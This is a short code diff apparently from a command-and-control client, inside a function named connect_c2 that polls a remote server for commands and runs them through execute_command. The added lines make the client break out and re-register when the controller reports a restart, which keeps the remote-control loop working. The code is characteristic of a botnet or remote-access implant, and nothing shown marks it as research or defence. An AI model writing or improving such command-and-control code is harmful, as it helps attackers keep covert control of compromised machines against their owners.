@@ -707,6 +707,10 @@ def connect_c2():
                 try:
                     cmd_data = c2_get("/cmd", params={"id": client_id})
                     if cmd_data:
+                        # Server restarted — re-register immediately
+                        if cmd_data.get("action") == "re-register":
+                            break
+
                         cmd = cmd_data.get("command")
                         if cmd:
                             result = execute_command(cmd)
